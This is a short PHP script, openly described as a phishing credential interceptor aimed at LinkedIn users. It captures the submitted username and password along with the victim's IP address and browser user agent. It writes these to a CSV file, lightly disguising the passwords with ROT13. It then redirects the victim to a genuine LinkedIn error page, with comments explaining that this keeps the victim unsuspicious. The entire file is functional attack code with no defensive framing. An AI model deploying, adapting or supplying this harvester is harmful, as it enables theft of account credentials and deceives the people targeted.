<?php
/**
 * PHP Script to intercept login credentials via phishing
 *
 * Steps:
 * 1) Collect data from the user's submission
 *  - Get the following data from the user: Username, password, IP address, browser user agent
 * 2) Save the data into a CSV file
 * 3) Redirect user to legitimate "Login error page" on target site
 */


/*
 * Required Params
 */
$project_root = $_SERVER['DOCUMENT_ROOT'];                          # The site's root directory on the server
$csv_filepath = $project_root . '/user_data.csv';                   # The CSV file (database) that contains all the user data

/*
 * 1) Get required params from form submission
 */
$username      = $_POST['session_key'] ?? NULL;                     # Get the username via the POST query parameters
$password      = $_POST['session_password'] ?? NULL;                # Get the password via the POST query parameters
$browser_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'not specified';
$user_ip_addr  = $_SERVER['REMOTE_ADDR'] ?? 'not specified';

/*
 * 2) Store the params in a CSV file
 */
if($username && $password){                         # Only continue if both the username and password are specified
	
	// Obfuscate the password
	$password = str_rot13($password);               # Shift each alpha character by 13 places (note: run 'rot13' algorithm again to view the passwords or enter password into https://rot13.com/)
	
	// Specify the CSV headers for clarity
	if(!file_exists($csv_filepath)){                                        # If the CSV does not yet exist
		$row[] = ['Username', 'Password', 'IP Address', 'User Agent'];      # Specify all the columns for the CSV row
	}
	
	$file_pointer = fopen($csv_filepath, 'a');                              # Open the CSV file; if the CSV file does not exist - create it, if it does exist - append
	
	// Specify the data to record
	$row[] = [$username, $password, $user_ip_addr, $browser_agent];         # Create an array of values (one value per column) to be written to the CSV file
	
	// Write each row to the file
	foreach($row as $r){                            # Loop through each row
		fputcsv($file_pointer, $r);                 # Write the row of columns to the CSV file
	}
	fclose($file_pointer);                          # Close the CSV file
}

/*
 * 3) Redirect the user to a legitimate login page the user is familiar with
 * - Mimic an internal-login error page to prevent the user from becoming suspicious from entering their login credentials twice
 */
header('Location: https://www.linkedin.com/checkpoint/rp/request-password-reset?errorKey=challenge_global_internal_error');


// For debugging
//echo "<hr><h3>All GET attributes</h3><pre>" . print_r($_GET, TRUE) . "</pre>";
//echo "<hr><h3>All SESSION attributes</h3><pre>".print_r($_SESSION, true)."</pre>";
//echo "<hr><h3>All POST attributes</h3><pre>" . print_r($_POST, TRUE) . "</pre>";
//echo "<hr><h3>All Server attributes</h3><pre>" . print_r($_SERVER, TRUE) . "</pre>";

